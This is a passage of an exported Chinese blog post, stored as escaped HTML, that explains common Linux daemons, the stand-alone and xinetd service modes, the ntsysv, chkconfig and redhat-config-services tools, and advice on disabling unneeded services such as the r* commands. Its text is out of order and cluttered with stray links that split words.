core</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2中最新推出的两个后台运行的守护程序。其作用是在启动系统期间，将启动系统所要用到的文件首先读取到内存中，然后在内存中进行执行，以加快系统的启动速</p><p>&nbsp;&nbsp;&nbsp;&nbsp;度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;68.rhnsd：Red Hat 网络服务守护进程。通知官方的安全信息以及为系统打补丁。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;69.routed ：该守护程序支持RIP协议的自动IP路由表维护。RIP主要 使用在小型网络上，大一点的网络就需要复杂一点的协议。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;70.rsync：remote sync远程数据备份守护进程。  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;71.rsh ：远程主机上启动一个shell，并执行用户命令。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;72.rwhod： 允许远程用户获得运行rwho守护程序的机器上所有已登录用户的列表。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;73.rstatd：一个为LAN上的其它机器收集和提供系统信息的守候进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;74.ruserd：远程用户定位服务，这是一个基于RPC的服务，它提供关于当前记录到LAN上一个机器日志中的用户信息 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;75.rwalld：激活rpc.rwall服务进程，这是一项基于RPC的服务，允许用户给每个注册到LAN机器上的其他终端写消息 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;76.rwhod：激活rwhod服务进程，它支持LAN的rwho和ruptime服务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;77.saslauthd： 使用SASL的认证守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;78.sendmail：邮件服务器sendmail守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;79.smb：Samba文件共享/打印服务守护进程。</p><p>&nbsp;&nbsp\n;&nbsp;&nbsp;80.snmpd：本地简单网络管理守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;81.squid：代理服务器squid守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;82.sshd：OpenSSH服务器守护进程。Secure Shell Protocol可以实现安全地远程管理主机。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;83.smartd：Self Monitor Analysis and Reporting Technology System，监控你的</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>硬盘</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;是否出现故障。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;84.syslog：一个让系统引导时起动syslog和klogd系统日志守候进程的脚本。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;85.time ：该守护进程从远程主机获取时间和日期，采用TCP协议。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;86.time-udp： 该守护进程从远程主机获取时间和日期，采用UDP协议。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;87.tux：在Linux内核中运行apache服务器的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;88.vsftpd：vsftpd服务器的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;89.vncserver： VNC （Virtual Network Computing，虚拟网络计算），它提供了一种在本地系统上显示远程计算机整个&quot;桌面&quot;的轻量型协议。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;90.xfs：X Window字型服务器守护进程，为本地和远程X服务器提供字型集。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;91.xinetd：支持多种网络服务的核心守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;92.ypbind：为NIS（网络信息系统）客户机激活ypbind服务进程 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;93.yppasswdd：NIS口令服务器守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;94.ypserv：NIS主服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;95.yum：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>RPM</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>操作系统</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>自动升级和软件包管理守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 二、守护进程工作原理和方式</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 在Cl</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ie</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;nt/Server模式下。服务器监听（Listen）在一个特定的端口上等待客户连接。连接成功后服务器和客户端通过端口进行数据通信。守护进程的工作就是打开一个端口，并且等待（Listen）进入连接。如果客户端产生一个连接请求，守护进程就创建（Fork）一个子服务器响应这个连接，而主服务器继续监听其他的服务请求。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2.守护进程工作方式：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（1）运行独立的守护进程</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 独立运行的守护进程由init脚本负责管理，所有独立运行的守护进程的脚本在/etc/rc.d/init.d/目录下。系统服务都是独立运行的守护进程包括：syslogd和cron等。运行独立的守护进程工作方式称作：stand－alone。它</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Unix</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;传</p><p>&nbsp;&nbsp;&nbsp;&nbsp;统的C/S模式的访问模式。服务器监听（Listen）在一个特点的端口上等待客户端的联机。如果客户端产生一个连接请求，守护进程就创建（Fork）一</p><p>&nbsp;&nbsp;&nbsp;&nbsp;个子服务器响应这个连接，而主服务器继续监听。以保持多个子服务器池等待下一个客户端请求。stand－alone模式工作原理见图1。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/75ea2d2fbe422bbb8b139956.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;          图1 stand－alone工作模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;工作在stand－alone模式下的网络服务有route、gated。另外是大家最熟悉是Web服务器：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Ap</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;ache和邮件服务器Sendmail、域名服务器Bind。因为这些负载很大服务器上，预先创子服务器，可以通过客户的服务速度。在</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Linux</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;系统中通过stand－alone工作模式启动的服务由/etc/rc.d/下面对应的运行级别当中的符号链接启动。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（2）xinetd模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;从守护进程的概念可以看出，对于系统所要通过的每一种服务，都必须运行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;一个监听某个端口连接所发生的守护进程，这通常意味着资源浪费。为了解决这个问题，Linux引进了“网络守护进程服务程序”的概念。Redhat</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux 9.0使用的网络守护进程是xinted（eXtended InterNET</p><p>&nbsp;&nbsp;&nbsp;&nbsp;daemon）。和stand－alone模式相比xinted模式也称 Internet</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Super－Server（超级服务器）。xinetd能够同时监听多个指定的端口，在接受用户请求时，他能够根据用户请求的端口不同，启动不同的网络服</p><p>&nbsp;&nbsp;&nbsp;&nbsp;务进程来处理这些用户请求。可以把xinetd看做一个管理启动服务的管理服务器，它决定把一个客户请求交给那个程序处理，然后启动相应的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;xinetd模式工作原理见图3。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/96e6d3ef3b8ee17063d09f56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;           图3  xinetd工作模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;stand－alone工作模式相比，系统不想要每一个网络服务进程都监听其服务端口。运行单个xinetd就可以同时监听所有服务端口，这样就降低了系</p><p>&nbsp;&nbsp;&nbsp;&nbsp;统开销，保护系统资源。但是对于访问量大、经常出现并发访问时，xinetd想要频繁启动对应的网络服务进程，反而会导致系统性能下降。察看系统为</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux服务提供那种模式方法在Linux命令行可以使用pstree命令可以看到两种不同方式启动的网络服务。一般来说系统一些负载高的服</p><p>&nbsp;&nbsp;&nbsp;&nbsp;务：sendmail、Apache服务是单独启动的。而其他服务类型都可以使用xinetd超级服务器管理。查看目前运行的守护进程可以使用命</p><p>&nbsp;&nbsp;&nbsp;&nbsp;令：“pstree”</p><p>&nbsp;&nbsp;&nbsp;&nbsp;三、守护进程管理工具</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux提供了三种不同的守护进程管理工具：redhat－config－services、ntsysv、chkconfig，可以根据具体需要灵活运用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（1） redhat－config－services</p><p>&nbsp;&nbsp;&nbsp;&nbsp; redhat－config－services</p><p>&nbsp;&nbsp;&nbsp;&nbsp;是一个一个图形化应用程序，它显示了每项服务的描述，以及每项服务是否在引导时启动（运行级别3、4、5），并允许你启动、停止、或重新启动/etc</p><p>&nbsp;&nbsp;&nbsp;&nbsp;/rc.d/init.d 中的哪些 SysV 服务，哪些 xinetd 服务。要从桌面启动服务配置工具，点击面板上的「主菜单」 =&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;「系统设置」 =&gt; 「服务器设置」 =&gt; 「服务」，或在 shell</p><p>&nbsp;&nbsp;&nbsp;&nbsp;提示下，键入命令：“redhat-config-services” （见图4）。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<i\nmg src=\"/images/pic/0d2a1924d14d7554908f9d56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp;  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;    图4 redhat-config-services配置工具</p><p>&nbsp;&nbsp;&nbsp;&nbsp; redhat-</p><p>&nbsp;&nbsp;&nbsp;&nbsp;config-services列出了 /etc/rc.d/init.d 中的服务和由 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;控制的服务。点击左侧列表中的服务名来显示该服务的简短描述以及它的服务状态。如果这个服务不是 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务，状态窗口会显示该服务目前是否在运行。如果该服务被 xinetd 所控制，状态窗口会显示「xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务」这个短语。要立即启动、停止、或重新启动某项服务，从列表中选择该项服务，然后点击工具栏上的相应按钮（或从「行动」拉下菜单中选择行动）。如果该</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务是一个 xinetd 服务，行动按钮会被禁用，因为它们不能被单个地启动或停止。 如果你通过选择或取消选择服务名旁的复选箱来启用或禁用了</p><p>&nbsp;&nbsp;&nbsp;&nbsp;xinetd 服务，你必须从拉下菜单中选择「文件」 =&gt; 「保存改变」来重新启动 xinetd，并立即启用或禁用你所改变的 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务。xinetd 还被配置成自动记忆设置。你可以同时启用或禁用多个 xinetd 服务，在结束后再保存改变。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; （2）ntsysv </p><p>&nbsp;&nbsp;&nbsp;&nbsp; ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;工具为激活或停运服务提供了简单的界面。你可以使用 ntsysv 来启动或关闭由 xinetd 管理的服务。你还可以使用 ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来配置运行级别。按照默认设置，只有当前运行级别会被配置。要配置不同的运行级别，使用 --level 选项来指定一个或多个运行级别。譬如，命令</p><p>&nbsp;&nbsp;&nbsp;&nbsp;ntsysv --level 345 配置运行级别3、4、和5。 ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;的工作界面见图1。使用上下箭头来上下查看列表。使用空格键来选择或取消选择服务，或用来“按”「确定」和「取消」按钮。要在服务列表和「确定」、「取</p><p>&nbsp;&nbsp;&nbsp;&nbsp;消」按钮中切换，使用 [Tab]键。* 标明某服务被设为启动。[F1] 键会弹出每项服务的简短描述。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;(3)chkconfig </p><p>&nbsp;&nbsp;&nbsp;&nbsp; chkconfig</p><p>&nbsp;&nbsp;&nbsp;&nbsp;命令也可以用来激活和解除服务。chkconfig --list</p><p>&nbsp;&nbsp;&nbsp;&nbsp;命令显示系统服务列表，以及这些服务在运行级别0到6中已被启动（on）还是停止（off）。chkconfig</p><p>&nbsp;&nbsp;&nbsp;&nbsp;还能用来设置某一服务在某一指定的运行级别内被启动还是被停运。譬如，要在运行级别3、4、5中停运 nfs 服务，使用下面的命令： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;chkconfig --level 345 nfs off</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 再结合一下脚本，需求不一样，自行修改。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; http://hi.baidu.com/key1088/blog/item/1e1cc63231a703b95fdf0e71.html</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 四、合理选择守护进程规避安全隐患</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 运行不必要或有漏洞的守护进程会给<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>操作系统</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>带</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来安全和性能上的影响。对于系统安全来说，如果操作系统中的任何一个漏洞，都可能使整个系统受到攻击。所以，增加系统安全的最佳办法就是尽量监视系统的功</p><p>&nbsp;&nbsp;&nbsp;&nbsp;能。文章开始介绍了重要的守护进程，其中“crond、syslog、keytable、xinetd、kudzu、iptables”等是需要运行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;的，echo、echo-udp、daytime、daytime-udp、chargen、chargen-udp主要是做调试用，普通用户基本用不</p><p>&nbsp;&nbsp;&nbsp;&nbsp;到，可以关闭。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; r字开头的守护进程：rsh、rstatd、rsync、ruser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>sd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;rwalld这些命令都是Berkley远程命令，因为都以字母r开头，故称r*命令。主要使用来使一台计算机上的某个用户以相同的帐户远程执行另一台计</p><p>&nbsp;&nbsp;&nbsp;&nbsp;算机的一个程序。但是，r命令已经被证实存在安全风险。对于确实需要的守护进程，应该尽量选用最新的版本程序，并增加其安全防范。  </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 另外我们还要合理选择守护进程例如innd是运行新闻组服务的进程，如果用户不做Usenet服务器，应该关掉。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;总结：</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 基于开放源代码的Linux给用户提供了这样一个平台：可以根据自己的软、硬件环境，定制自己的Linux守护进程。因此，根据每个用户不同的应用范围定制应用环境，可以将Linux系统的安全和性能提升到新的高度。 </p><p>&nbsp;</p><p>&nbsp;</p>","slug":"linux-常见服务","published":1,"updated":"2023-04-22T05:38:44.801Z","_id":"clgrjlxg500337opidhvr2r3t","comments":1,"layout":"post","photos":[],"link":"","content":"<p>&nbsp; <a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Linux</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务器在启动时需要启动很多系统服务，它们向本地和网络用户提供了Linux的系统功能接口，直接面向应用程序和用户。提供这些服务的程序是由运行在后台的守护进程（daemons）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来执行的。守护进程是生存期长的一种进程。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。他们常常在系统引导装入时启动，在系统</p><p>&nbsp;&nbsp;&nbsp;&nbsp;关闭时终止。linux系统有很多守护进程，大多数服务器都是用守护进程实现的。同时，守护进程完成许多系统任务，比如，作业规划进程crond、打印进</p><p>&nbsp;&nbsp;&nbsp;&nbsp;程lqd等。有些书籍和资料也把守护进程称作：“服务”。选择运行哪些守护进程，要根据具体需求决定。查看系统可以提供的守护进程对应的服务，使用下面方</p><p>&nbsp;&nbsp;&nbsp;&nbsp;法，以root权限运行： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;#ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/8de818da5f4ed57b10df9b56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;   图1 可以选择的系统服务 </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 界面如图1所示的窗口，下面详细介绍一下各项系统服务的功能。以英文字母为序： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;    一、Linux守护进程简介</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1.alsasound</p><p>&nbsp;&nbsp;&nbsp;&nbsp;：Alsa声卡驱动守护程序。Alsa声卡驱动程序本来是为了 一种声卡Gravis UltraSound(GUS)而写的，该程序被证</p><p>&nbsp;&nbsp;&nbsp;&nbsp;明很优秀，于是作者就开始为一般的声卡写 驱动程序。 Alsa和OSS/Free 及OSS/Linux兼容，但是有自己的接</p><p>&nbsp;&nbsp;&nbsp;&nbsp;口，甚至比OSS优秀。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;2.acpid：acpid（Advanced Configuration and Power Interface）是为替代传统的</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://wiki.ccw.com.cn/APhttp://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>AP</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;M电源管理标准而推出的新型电源管理标准。通常笔记本电脑需要启动电源进行管理。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;3.atalk：AppleTalk网络守护进程。注意不要在后台运行该程序，该程序的数据结构必须在运行其他进程前先花一定时间初始化。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;4.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://topic.ccw.com.cn/corpCenter/592.htmlhttp://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>amd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;： 自动安装NFS守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;5.anacron：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;一个自动化运行任务守护进程。Red Hat Linux 随带四个自动化任务的工具：cron、 anacron、at、和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;batc。当你的Linux服务器并不是全天运行，这个anacron就可以帮你执行在&quot;crontab&quot;设定的时间内没有执行的工作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;6.apmd：apmd（Advanced Power Management）是高级电源管理。传统的电源管理标准，对于笔记本电脑比较有用，可以了解系统的电池电量信息。并将相关信息通过syslogd 写入日志。也可以用来在电源不足时关机。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;7.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>arp</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;tables_jf ：为arptables网络的用户控制过滤的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;8.arpwatch： 记录日志并构建一个在LAN接口上看到的以太网地址和IP地址对<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>数据库</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong> 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;atd：at和batch命令守护进程，用户用at命令调度的任务。Batch用于在系统负荷比较低时  运行批处理任务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;9.autofs：自动安装管理进程automount，与NFS相关，依赖于NIS服务器。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;10.bootparamd：引导参数服务器，为LAN上的无盘工作站提供引导所需的相关信息。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;11.bluetooch：蓝牙服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;12.crond ：cron是</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Unix</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;下的一个传统程序，该程序周期地运行用户 调度的任务。比起传统的Unix版本，Linux版本添加了不少属性，而且更安全，配置更简单。类似计划任务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;13.chargen：使用tcp协议的chargen server，chargen（Character Generator  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Pro</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;tocol）是一种网络服务，主要功能是提供类似远程打字的功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;14.chargen-udp：使用UDP协议的chargen server。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;15.cpuspeed：监测系统空闲百分比，降低或加快CPU时钟速度和电压从而在系统空闲时将能源消耗降为最小，而在系统繁忙时最大化加快系统执行速度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;16.dhcpd：动态主机控制协议(Dynamic Host Control Protocol)的服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;17.cups： cups(Common UNIX Printing System)是通用UNIX打印守护进程，为Linux提供第三代打印功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;18.cups－config－daemons：cups打印系统切换守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;19.cups-lpd：cups行打印守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;20.daytime：使用TCP 协议的Daytime守护进程，该协议为客户机实现从远程服务器获取日期 和时间的功能。预设端口：13。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;21.daytime-udp：使用UDP 协议的Daytime守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;22.dc_server：使用SSL安全套接字的代理服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;23.dc_cl</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ie</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;nt：使用SSL安全套接字的客户端守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;24.diskdump：服务器磁盘备份守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;25.echo：服务器回显客户数据服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;26.echo-udp：使用UDP协议的服务器回显客户数据服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;27.eklogin：接受rlogin会话鉴证和用kerberos5加密的一种服务的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;28.gated ：网关路由守护进程。它支持各种路由协议，包括RIP版本1和2、DCN HELLO协议、 OSPF版本2以及EGP版本2到4。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;29.gpm：gpm（General Purpose Mouse Daemon ）守护进程为文本模式下的Linux程序如mc(Midnight Commander)提供了鼠标的支持。它也支持控制台下鼠标 的拷贝，粘贴操作以及弹出式菜单。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;30.gssftp： 使用kerberos 5认证的ftp守护进程</p><p>&nbsp;&nbsp;&nbsp;&nbsp;31.httpd：Web服务器Apache守护进程，可用来提供HTML文件以 及CGI动态内容服务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;32.inetd ：因特网操作守护程序。监控网络对各种它管理的服务的需求，并在必要的时候启动相应的服务程序。在Redhat 和Mandrake linux中被\nxinetd代替。Debian, Slackware, </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>SuSE</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;仍然使用。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;33.innd：Usenet新闻服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;34.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ii</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;im：中文输入法服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;35.iptables：iptables防火墙守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;36.irda：红外端口守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;37.i</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>sd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;n：isdn启动和中止服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;38.krb5－telnet:使用kerberos 5认证的telnet守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;39.klogin：远程登陆守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;40.keytable： 该进程的功能是转载在/etc/sysconfig/keyboards里定义的键盘映射表，该表可以通过kbdconfig工具进行选择。您应该使该程序处于激活状态。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;41.irqbalance：对多个系统处理器环境下的系统中断请求进行负载平衡的守护程序。如果你只安装了一个CPU，就不需要加载这个守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;42.kshell ：kshell守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;43.kudzu：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;硬件自动检测程序，会自动检测硬件是否发生变动，并相应进行硬件的添加、删除工作。当系统启动时，kudzu会对当前的硬件进行检测，并且和存储</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在     </p><p>&nbsp;&nbsp;&nbsp;&nbsp;/etc/sysconfig/hwconf中的硬件信息进行对照，如果某个硬件从系统中被添加或者删除时，那么kudzu就会察觉到，并且通知用户是否</p><p>&nbsp;&nbsp;&nbsp;&nbsp;进行相关配置，然后修改etc/sysconfig/hwconf，使硬件资料与系统保持同步。如果/etc/sysconfig/hwconf这个文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;不存在，那么kudzu将会从/etc/modprobe.conf，/etc/sysconfig/network-scripts/和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;etc/X11/XF86Config中探测已经存在的硬件。如果你不打算增加新硬件，那么就可以关闭这个启动服务，以加快系统启动时间。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;44.ldap：ldap（Lightweight Directory Access Protocol）目录访问协议服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;45.lm_ser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>oem</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;s：检测主板工作情况守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;46.lpd ：lpd是老式打印守护程序，负责将lpr等程序提交给打印 作业。 